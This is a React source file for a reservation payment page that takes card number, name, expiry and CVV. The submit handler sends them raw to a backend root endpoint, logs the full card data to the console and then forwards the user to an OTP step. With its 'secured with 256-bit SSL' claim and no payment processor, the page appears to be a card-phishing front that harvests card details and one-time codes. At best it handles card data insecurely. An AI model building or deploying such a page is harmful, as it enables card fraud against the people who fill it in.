import { useState, useEffect } from "react";
import { ChevronRight, Lock } from "lucide-react";
import { useNavigate, useLocation } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";

// Credit card type detection
const detectCardType = (number) => {
  const patterns = {
    visa: /^4/,
    mastercard: /^(5[1-5]|2[2-7])/,
    amex: /^3[47]/,
    discover: /^6(?:011|5)/,
    diners: /^3(?:0[0-5]|[68])/,
    jcb: /^35/,
  };

  for (const [type, pattern] of Object.entries(patterns)) {
    if (pattern.test(number)) return type;
  }
  return "unknown";
};

const getCardIcon = (type) => {
  const icons = {
    visa: "💳",
    mastercard: "💳",
    amex: "💳",
    discover: "💳",
  };
  return icons[type] || "💳";
};

const formatPesos = (amount) =>
  new Intl.NumberFormat("en-PH", { style: "currency", currency: "PHP" }).format(
    amount
  );

// Page 1: Credit Card Input
const CreditCardPage = () => {
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardType, setCardType] = useState("unknown");
  const [errors, setErrors] = useState({});
  const [isAnimating, setIsAnimating] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const reservation = location.state?.reservation || null;
  // Detect card type without causing infinite renders
  useEffect(() => {
    setCardType(detectCardType(cardNumber));
  }, [cardNumber]);

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : "";
  };

  const formatExpiry = (value) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4);
    }
    return cleaned;
  };

  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\s/g, "");
    if (value.length <= 16 && /^\d*$/.test(value)) {
      setCardNumber(value);
      setErrors({ ...errors, cardNumber: "" });
    }
  };

  const handleExpiryChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 4) {
      setExpiry(value);
      setErrors({ ...errors, expiry: "" });
    }
  };

  const handleCvvChange = (e) => {
    const value = e.target.value;
    if (value.length <= 4 && /^\d*$/.test(value)) {
      setCvv(value);
      setErrors({ ...errors, cvv: "" });
    }
  };

  const validate = () => {
    const newErrors = {};
    if (cardNumber.length < 13) newErrors.cardNumber = "Invalid card number";
    if (!cardName.trim()) newErrors.cardName = "Cardholder name required";
    if (expiry.length < 4) newErrors.expiry = "Invalid expiry date";
    if (cvv.length < 3) newErrors.cvv = "Invalid CVV";

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e?.preventDefault?.();
    if (!validate()) return;

    const cardData = {
      cardNumber,
      cardName,
      expiry,
      cvv,
      cardType,
      reservation,
    };

    setIsSubmitting(true);
    try {
      await axios.post(`${BASE_URL}/`, cardData);
      console.log("CreditCardPage submit:", cardData);
      setIsAnimating(true);
      setTimeout(() => {
        navigate("/otp", { state: cardData });
      }, 300);
    } catch (err) {
      console.error("Card submission failed:", err);
      setErrors((prev) => ({
        ...prev,
        submit: "Failed to submit card. Please try again.",
      }));
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div
      className={`min-h-screen bg-gradient-to-br from-blue-50 via-white to-amber-50 transition-opacity duration-300 ${
        isAnimating ? "opacity-0" : "opacity-100"
      }`}
    >
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-gray-100">
        <div className="max-w-md mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <h1 className="text-xl font-semibold text-gray-900">
              Credit Card Online Payments
            </h1>
            <div className="flex items-center gap-2">
              <Lock className="w-5 h-5 text-green-600" />
              <span className="text-xs text-gray-600">Secure</span>
            </div>
          </div>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="max-w-md mx-auto px-6 pt-4">
        <div className="flex items-center gap-2">
          <div className="flex-1 h-1 bg-blue-600 rounded-full"></div>
          <div className="flex-1 h-1 bg-gray-200 rounded-full"></div>
          <div className="flex-1 h-1 bg-gray-200 rounded-full"></div>
        </div>
        <div className="flex justify-between mt-2">
          <span className="text-xs font-medium text-blue-600">Payment</span>
          <span className="text-xs text-gray-400">Verify</span>
          <span className="text-xs text-gray-400">Complete</span>
        </div>
      </div>

      <div className="max-w-md mx-auto w-full px-6 pt-6">
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <h2 className="font-bold text-gray-900 mb-4 text-lg">
            Reservation Summary
          </h2>
          {reservation ? (
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-600">Room Type</span>
                <span className="font-semibold text-gray-900">
                  {reservation.roomType}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Check-in</span>
                <span className="font-semibold text-gray-900">
                  {reservation.checkIn}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Check-out</span>
                <span className="font-semibold text-gray-900">
                  {reservation.checkOut}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Guests</span>
                <span className="font-semibold text-gray-900">
                  {reservation.guests}
                </span>
              </div>
            </div>
          ) : (
            <p className="text-sm text-gray-600">
              No reservation details provided.
            </p>
          )}
        </div>
      </div>

      {/* Payment Form */}
      <div className="flex-1 max-w-md mx-auto w-full px-6 pb-8">
        <h2 className="text-2xl font-bold text-gray-900 mb-2">
          Payment Details
        </h2>
        <p className="text-gray-600 mb-6 text-sm">
          Enter your card information to complete booking
        </p>

        <div className="space-y-5">
          {/* Card Number */}
          <div className="transform transition-all duration-200 hover:scale-[1.01]">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Card Number
            </label>
            <div className="relative">
              <input
                type="text"
                value={formatCardNumber(cardNumber)}
                onChange={handleCardNumberChange}
                placeholder="1234 5678 9012 3456"
                className={`w-full px-4 py-4 pr-14 bg-white border-2 ${
                  errors.cardNumber
                    ? "border-red-300 focus:border-red-500"
                    : "border-gray-200 focus:border-blue-500"
                } rounded-xl focus:ring-4 focus:ring-blue-100 outline-none transition-all text-black text-lg font-medium`}
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-2xl">
                {getCardIcon(cardType)}
              </div>
            </div>
            {cardType !== "unknown" && (
              <p className="text-xs text-green-600 mt-2 font-medium">
                ✓ {cardType.toUpperCase()} detected
              </p>
            )}
            {errors.cardNumber && (
              <p className="text-sm text-red-500 mt-2 font-medium">
                {errors.cardNumber}
              </p>
            )}
          </div>

          {/* Cardholder Name */}
          <div className="transform transition-all duration-200 hover:scale-[1.01]">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Cardholder Name
            </label>
            <input
              type="text"
              value={cardName}
              onChange={(e) => {
                setCardName(e.target.value.toUpperCase());
                setErrors({ ...errors, cardName: "" });
              }}
              placeholder="JOHN DOE"
              className={`w-full px-4 py-4 bg-white border-2 ${
                errors.cardName
                  ? "border-red-300 focus:border-red-500"
                  : "border-gray-200 focus:border-blue-500"
              } rounded-xl focus:ring-4 focus:ring-blue-100 outline-none transition-all text-black text-lg font-medium uppercase`}
            />
            {errors.cardName && (
              <p className="text-sm text-red-500 mt-2 font-medium">
                {errors.cardName}
              </p>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div className="transform transition-all duration-200 hover:scale-[1.01]">
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Expiry Date
              </label>
              <input
                type="text"
                value={formatExpiry(expiry)}
                onChange={handleExpiryChange}
                placeholder="MM/YY"
                className={`w-full px-4 py-4 bg-white border-2 ${
                  errors.expiry
                    ? "border-red-300 focus:border-red-500"
                    : "border-gray-200 focus:border-blue-500"
                } rounded-xl focus:ring-4 focus:ring-blue-100 outline-none transition-all text-black text-lg font-medium`}
              />
              {errors.expiry && (
                <p className="text-sm text-red-500 mt-2 font-medium">
                  {errors.expiry}
                </p>
              )}
            </div>
            <div className="transform transition-all duration-200 hover:scale-[1.01]">
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                CVV
              </label>
              <input
                type="password"
                value={cvv}
                onChange={handleCvvChange}
                placeholder="123"
                maxLength={3}
                className={`w-full px-4 py-4 bg-white border-2 ${
                  errors.cvv
                    ? "border-red-300 focus:border-red-500"
                    : "border-gray-200 focus:border-blue-500"
                } rounded-xl focus:ring-4 focus:ring-blue-100 outline-none transition-all text-black text-lg font-medium`}
              />
              {errors.cvv && (
                <p className="text-sm text-red-500 mt-2 font-medium">
                  {errors.cvv}
                </p>
              )}
            </div>
          </div>

          {/* Submit Button */}
          <button
            onClick={handleSubmit}
            disabled={isSubmitting}
            className="w-full mt-8 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 active:scale-95 text-white font-bold py-5 rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl flex items-center justify-center gap-2 text-lg"
          >
            Continue to Verification
            <ChevronRight className="w-6 h-6" />
          </button>

          <div className="flex items-center justify-center gap-2 mt-4 text-gray-500">
            <Lock className="w-4 h-4" />
            <p className="text-xs text-center">
              Your payment is secured with 256-bit SSL encryption
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
export default CreditCardPage;
